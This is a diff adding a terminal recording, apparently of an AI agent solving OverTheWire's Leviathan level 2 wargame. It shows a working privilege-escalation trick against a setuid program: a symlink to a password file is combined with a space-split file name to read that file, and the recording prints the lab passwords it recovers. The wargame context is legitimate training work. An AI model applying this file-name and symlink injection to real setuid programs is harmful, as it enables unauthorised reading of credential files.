@@ -1,0 +1,9 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793471384,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/leviathan/L2.sh","title":"Leviathan L2: printfile space/symlink trick","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223   # password ERJ9jTYWXE\r\r\n$ strings printfile   # setuid leviathan3; runs  /bin/cat %s  after access() check\r\r\n$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 file printfile; strings printfile | grep -E \"Usage|cat|Cant\"\r\r\n"]
+[4.493, "o", "printfile: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=edf95678ff2bfd80bf9c289f61a91a378c55cfb8, for GNU/Linux 3.2.0, not stripped\r\r\n"]
+[0.001, "o", "Usage: %s filename\r\r\n/bin/cat %s\r\r\n_dl_relocate_static_pie\r\r\n"]
+[0.001, "o", "$ trick: access() checks \"/tmp/l2/a b\" (a real file we can access) but /bin/cat splits on the space\r\r\n$   -> symlink /tmp/l2/a -> /etc/leviathan_pass/leviathan3, then create a real file \"/tmp/l2/a b\"\r\r\n$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223 rm -rf /tmp/l2; mkdir -p /tmp/l2; ln -s /etc/leviathan_pass/leviathan3 /tmp/l2/a; touch \"/tmp/l2/a b\"; ls -la /tmp/l2; ./printfile \"/tmp/l2/a b\"\r\r\n"]
+[6.109, "o", "total 0\r\r\ndrwxrwxr-x   2 leviathan2 leviathan2   80 Oct 31 18:29 .\r\r\ndrwxrwx-wt 159 root       root       3640 Oct 31 18:29 ..\r\r\nlrwxrwxrwx   1 leviathan2 leviathan2   30 Oct 31 18:29 a -> /etc/leviathan_pass/leviathan3\r\r\n-rw-rw-r--   1 leviathan2 leviathan2    0 Oct 31 18:29 a b\r\r\nPiEpxxknZH\r\r\ncat: b: No such file or directory\r\r\n"]
+[0.001, "o", "$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223   # verify PiEpxxknZH\r\r\n$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223 whoami\r\r\n"]
+[5.072, "o", "leviathan3\r\r\n"]
+[0.003, "x", "0"]
